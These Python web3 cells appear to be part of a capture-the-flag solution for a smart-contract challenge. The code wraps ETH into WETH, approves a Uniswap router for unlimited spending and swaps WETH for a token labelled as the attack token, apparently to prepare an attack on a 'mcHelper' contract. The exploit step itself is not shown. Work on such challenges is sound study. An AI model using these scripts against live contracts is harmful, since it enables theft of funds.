```python
from web3 import Web3
import json
from eth_account import Account


web3 = Web3(Web3.HTTPProvider(""))




private_key = ""


ACC_ADDRESS = Account.from_key(private_key).address


setup_contract = web3.eth.contract(
        address=Web3.toChecksumAddress(""), abi=json.load(open("setup.json", "r"))
    )

mc_addr = setup_contract.functions.mcHelper().call()
mc_contract = web3.eth.contract(
    address=Web3.toChecksumAddress(mc_addr), abi=json.load(open("chefhelper.json", "r")))

ATTACK_TOKEN_ADDR = "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"
token_contract = web3.eth.contract(address=ATTACK_TOKEN_ADDR, abi=json.load(open("erc20.json", "r")))

SIDE_TOKEN_ADDR = "0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c"
side_token_contract = web3.eth.contract(address=SIDE_TOKEN_ADDR, abi=json.load(open("erc20.json", "r")))

WETH_CONTRACT_ADDR = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
weth_contract = web3.eth.contract(address=WETH_CONTRACT_ADDR, abi=json.load(open("erc20.json", "r")))

uni_addr = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"
uni_contract = web3.eth.contract(address=uni_addr, abi=json.load(open("unirouter.json", "r")))
```

```python
for i in range(100):

    nonce = web3.eth.get_transaction_count(ACC_ADDRESS)
    print("Nonce:", nonce)
    transaction =  weth_contract.functions.deposit().buildTransaction({
        "value": 10**19,
        'nonce': nonce,
        'maxFeePerGas': 0,
        'maxPriorityFeePerGas': 0,
        'from': ACC_ADDRESS
    }
    )

    signed_transaction = web3.eth.account.sign_transaction(transaction, private_key=private_key)

    web3.eth.send_raw_transaction(signed_transaction.rawTransaction)
```

```python
nonce = web3.eth.get_transaction_count(ACC_ADDRESS)
print("Nonce:", nonce)
transaction = weth_contract.functions.approve(uni_addr, 2**256-1).buildTransaction({
    "value": 0,
    'nonce': nonce,
    'maxFeePerGas': 0,
    'maxPriorityFeePerGas': 0,
    'from': ACC_ADDRESS
}
)

signed_transaction = web3.eth.account.sign_transaction(
    transaction, private_key=private_key)

web3.eth.send_raw_transaction(signed_transaction.rawTransaction)


nonce = web3.eth.get_transaction_count(ACC_ADDRESS)
print("Nonce:", nonce)
transaction = uni_contract.functions.swapExactTokensForTokens(500*10**18, 0, [WETH_CONTRACT_ADDR, ATTACK_TOKEN_ADDR], ACC_ADDRESS, 9999999999999999999).buildTransaction({
    "value": 0,
    'nonce': nonce,
    'maxFeePerGas': 0,
    'maxPriorityFeePerGas': 0,
    'from': ACC_ADDRESS
}
)

signed_transaction = web3.eth.account.sign_transaction(
    transaction, private_key=private_key)

res = web3.eth.send_raw_transaction(signed_transaction.rawTransaction)
web3.eth.wait_for_transaction_receipt(res)
```
